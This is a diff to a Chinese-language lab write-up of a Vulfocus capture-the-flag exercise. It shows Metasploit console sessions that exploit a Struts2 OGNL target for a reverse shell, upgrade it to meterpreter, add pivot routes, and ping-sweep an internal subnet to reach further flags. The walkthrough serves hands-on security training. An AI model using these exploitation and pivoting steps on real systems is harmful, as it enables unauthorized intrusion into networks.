@@ -401,7 +401,7 @@ $ docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${containe
 
 #### 外层网络渗透
 
-##### 🚩攻破靶标-1
+##### 🚩攻破靶标 1
 
 从模拟显示的角度来考虑，最外层的主机负责对外提供服务，于是直接得到了提供服务的端口号，也就是vulfocus平台上场景的入口端口
 
@@ -510,8 +510,7 @@ msf6 >
 
   <img src="../程若楠/img/show_options.png" alt="show_options" style="zoom:50%;" />
 
-
-  <img src="../程若楠/img/set_exp.png" alt="set_exp" style="zoom:50%;" />
+<img src="../程若楠/img/set_exp.png" alt="set_exp" style="zoom:50%;" />
 
 - 接下进行 getshell，如果攻击成功，查看打开的 reverse shell，进入会话后，发现无命令行交互提示信息，此时我们试一试 Bash 指令，可以发现我们已经打下了第一个靶标，查看其 `/tmp` 目录，成功得到 `flag1`。
 
@@ -534,22 +533,113 @@ msf6 >
   # 通过 CTRL-Z 将当前会话放到后台继续执行
   ```
 
+<img src="img/flag1.png" alt="flag1" style="zoom:50%;" />
 
-  <img src="img/flag1.png" alt="flag1" style="zoom:50%;" />
+#### 中层网络渗透
 
+##### 🚩攻破靶标 2-4
 
+当拿到外层主机的shell之后是需要对外层主机所在内部网络进行扫描，尝试找出进一步向深层进发的跳板主机，需要做的5个步骤大概是如下内容：
 
+1. **对已攻入主机所在内网网段中其他主机进行存活验证**
 
+2. **对存活的其他主机进行端口扫描**
 
+3. **对已开放端口号进行信息收集，得到开放的服务的信息**
 
+4. **从开放的服务入手获取版本寻找可用的漏洞**
 
+5. **确定漏洞，装载payload，exploit**
 
+很显然上面的5个步骤中这边能够走过的是1，2和5，类似于已知了漏洞的前提下进行操作
 
+首先是将已经获得的1号会话即外层主机shell升级为`meterpreter`，说是升级并且执行的命令也是`sessions -u 1`，其实是通过上传名为`post/multi/manage/shell_to_meterpreter`的payload的方式开启更多功能的会话：
 
+```shell
+msf6 exploit(multi/http/struts2_multi_eval_ognl) > sessions
+Active sessions
+===============
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
 
+msf6 exploit(multi/http/struts2_multi_eval_ognl) > sessions -u 1
+[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
 
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 192.168.56.107:4433
+[*] Sending stage (1017704 bytes) to 192.168.56.1
+[*] Meterpreter session 2 opened (192.168.56.107:4433 -> 192.168.56.1:60598) at 2023-07-26 05:44:37 -0400
+[*] Command stager progress: 100.00% (773/773 bytes)
+msf6 exploit(multi/http/struts2_multi_eval_ognl) > sessions
 
+Active sessions
+===============
+  Id  Name  Type                   Information          Connection
+  --  ----  ----                   -----------          ----------
+  1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
+  2         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60598 (172.29.108.146)
 
+msf6 exploit(multi/http/struts2_multi_eval_ognl) >
+```
+
+此时使用2号会话的meterperter就可以直接查看外层主机的网卡信息了，于是便获得了一个新的内网网段`192.171.84.0/24`：
+
+![screenShot](../hoshi/img/2023-07-26-174733.png)
+
+当然最主要的还是需要用meterpreter实现让外层的主机作为中介路由，将下一步内网扫描的包转发过去，此时会用到`post/multi/manage/autoroute`模块，只需要将会话ID填入即可，之后运行便会自动添加路由信息到Metasploit的路由表中
+
+![route](img/route.png)
+
+之后的顺序应该为先进行存活验证后进行端口扫描，如此可以通过存活性筛除掉不必要的IP地址，可以让端口扫描更快速更高效，这里选择使用模块`post/multi/gather/ping_sweep`，填入必要的options之后就可以进行扫描了：
+
+```shell
+msf6 exploit(multi/http/struts2_multi_eval_ognl) > search ping_sweep
+
+Matching Modules
+================
+   #  Name                          Disclosure Date  Rank    Check  Description
+   -  ----                          ---------------  ----    -----  -----------
+   0  post/multi/gather/ping_sweep                   normal  No     Multi Gather Ping Sweep
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/gather/ping_sweep
+
+msf6 exploit(multi/http/struts2_multi_eval_ognl) > use 0
+msf6 post(multi/gather/ping_sweep) > options
+
+Module options (post/multi/gather/ping_sweep):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       IP Range to perform ping sweep against.
+   SESSION                   yes       The session to run this module on
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/gather/ping_sweep) > set rhosts 192.171.84.2-254
+rhosts => 192.171.84.2-254
+msf6 post(multi/gather/ping_sweep) > set session 2
+session => 2
+msf6 post(multi/gather/ping_sweep) > run
+
+[*] Performing ping sweep for IP range 192.171.84.2-254
+[+]     192.171.84.5 host found
+[+]     192.171.84.3 host found
+[+]     192.171.84.4 host found
+[+]     192.171.84.2 host found
+[*] Post module execution completed
+msf6 post(multi/gather/ping_sweep) >
+```
+
+进入会话中，查看 `/tmp` 目录，成功找到 `flag2-4`
+
+```bash
+# get flag2-4
+$ sessions -c "ls /tmp" -i 6,7,8
+```
+
+<img src="img/flag2-4.png" alt="flag2-4" style="zoom:50%;" />
 
 
 
